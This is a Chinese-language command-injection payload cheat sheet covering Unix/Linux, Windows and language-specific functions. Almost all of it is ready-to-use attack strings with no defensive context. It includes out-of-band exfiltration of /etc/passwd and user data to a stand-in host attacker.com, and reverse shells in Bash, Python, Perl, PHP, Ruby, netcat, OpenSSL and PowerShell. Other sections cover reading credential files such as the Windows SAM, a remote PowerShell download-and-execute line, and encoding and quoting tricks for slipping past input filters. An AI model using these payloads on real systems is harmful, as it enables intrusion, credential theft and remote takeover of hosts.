# 命令注入 Payload 模板

## Unix/Linux 命令注入

### 基础检测

```bash
# 命令分隔符
; id
| id
|| id
&& id
& id
`id`
$(id)
\nid
```

### 时间盲注

```bash
; sleep 5
| sleep 5
|| sleep 5
&& sleep 5
& sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

### 带外数据提取

```bash
# DNS 外带
; nslookup $(whoami).attacker.com
; dig $(cat /etc/passwd | base64).attacker.com
; host $(id | base64).attacker.com

# HTTP 外带
; curl http://attacker.com/?d=$(id | base64)
; wget http://attacker.com/?d=$(cat /etc/passwd | base64)
; curl -d @/etc/passwd http://attacker.com/
; nc attacker.com 4444 -e /bin/sh
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### 文件读取

```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; more /etc/passwd
; less /etc/passwd
; tac /etc/passwd
; nl /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
; strings /etc/passwd
```

### 反弹 Shell

```bash
# Bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

# Python
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
; ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
; nc -e /bin/sh attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# OpenSSL
; mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:4444 >/tmp/s;rm /tmp/s
```

### 绕过技术

#### 空格绕过

```bash
# 使用 IFS
; cat${IFS}/etc/passwd
; cat$IFS/etc/passwd
; cat$IFS$9/etc/passwd

# 使用大括号
; {cat,/etc/passwd}
; {id,}

# 使用重定向
; cat</etc/passwd
; cat<>/etc/passwd

# 使用 $IFS
; cat$IFS'/etc/passwd'
```

#### 关键词绕过

```bash
# 变量拼接
; c=at;a=/etc/passwd;$c $a
; c=a;t=cat;$c$t /etc/passwd
; ca''t /etc/passwd
; ca""t /etc/passwd
; c\at /etc/passwd

# 使用变量
; $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# 通配符
; /???/??t /???/p??s??
; /bin/cat /etc/passwd
; /bin/c[a]t /etc/p[a]sswd
```

#### 编码绕过

```bash
# Base64
; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# Hex
; echo 636174202f6574632f706173737764 | xxd -r -p | sh

# Octal
; printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | sh
```

#### 长度限制绕过

```bash
# 写入文件执行
; echo -n "cat /e">a
; echo -n "tc/pas">>a
; echo -n "swd">>a
; sh a
```

## Windows 命令注入

### 基础检测

```cmd
| whoami
|| whoami
& whoami
&& whoami
%0a whoami
%0a%0d whoami
`whoami
$(whoami)
```

### 时间盲注

```cmd
| ping -n 5 127.0.0.1
& ping -n 5 127.0.0.1
&& ping -n 5 127.0.0.1
```

### 带外数据提取

```cmd
# DNS 外带
& nslookup %username%.attacker.com
& for /f "tokens=*" %i in ('whoami') do nslookup %i.attacker.com

# HTTP 外带
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/?d='+$env:username)"
& certutil -urlcache -f http://attacker.com/?d=%username%
```

### 文件读取

```cmd
| type c:\windows\win.ini
| type c:\windows\system32\config\sam
& more c:\windows\win.ini
```

### 反弹 Shell

```powershell
# PowerShell
| powershell -c "$c=New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String );$s.Write([text.encoding]::ASCII.GetBytes($o))};$c.Close()"

# PowerShell 简化版
| powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell One-Liner
| powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com/shell.ps1')
```

### 绕过技术

#### 空格绕过

```cmd
| type,c:\windows\win.ini
& type,c:\windows\win.ini
```

#### 关键词绕过

```cmd
# 环境变量
| %COMSPEC% /c whoami
| c^m^d /c whoami
| c""md /c whoami

# 变量拼接
& set a=who& set b=ami& %a%%b%
```

#### 编码绕过

```cmd
# PowerShell 编码
| powershell -e <base64-encoded-command>
| powershell -enc <base64-encoded-command>

# 生成编码命令
# powershell -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))"
```

## 语言特定 Payload

### PHP

```php
# 常见危险函数
; system('id')
; exec('id')
; shell_exec('id')
; passthru('id')
; `id`
; popen('id', 'r')
; proc_open('id', ...)
```

### Python

```python
# 危险函数调用
; os.system('id')
; os.popen('id').read()
; subprocess.call('id', shell=True)
; subprocess.Popen('id', shell=True)
; commands.getoutput('id')
```

### Node.js

```javascript
# 危险函数调用
; require('child_process').exec('id')
; require('child_process').execSync('id')
; require('child_process').spawn('id', [], {shell: true})
```

### Java

```java
# Runtime.exec
; Runtime.getRuntime().exec('id')
; new ProcessBuilder('id').start()
```

### Go

```go
# exec.Command
; exec.Command('id').Output()
; exec.Command('bash', '-c', 'id').Output()
```